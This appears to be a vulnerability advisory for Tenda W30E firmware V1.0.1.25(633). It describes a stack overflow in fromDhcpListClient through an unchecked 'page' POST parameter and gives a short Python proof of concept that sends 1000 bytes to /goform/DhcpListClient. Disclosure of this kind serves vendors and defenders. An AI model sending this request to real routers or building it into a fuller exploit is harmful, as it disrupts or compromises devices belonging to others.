## Overview

- Firmware download website: https://www.tenda.com.cn/download/detail-2218.html

## Affected version

W30Ev1.0 V1.0.1.25(633)

## Vulnerability details

The Tenda W30Ev1.0 V1.0.1.25(633) firmware has a stack overflow vulnerability in the `fromDhcpListClient` function. The `v4` variable receives the `page` parameter from a POST request. The value is directly used in a `sprintf` function and passes to a local variable on the stack, which can override the return address of the function. The user-provided `v4` can trigger this security vulnerability.

![image-20240320012345206](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240320012345206.png)

![image-20240320012325044](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240320012325044.png)

![image-20240320012335792](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240320012335792.png)

## POC

```python
import requests
from pwn import*

ip = "192.168.84.101"
url = "http://" + ip + "/goform/DhcpListClient"
payload = b"a"*1000

data = {"page": payload}
response = requests.post(url, data=data)
print(response.text)
```

![image-20240409102128135](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240409102128135.png)
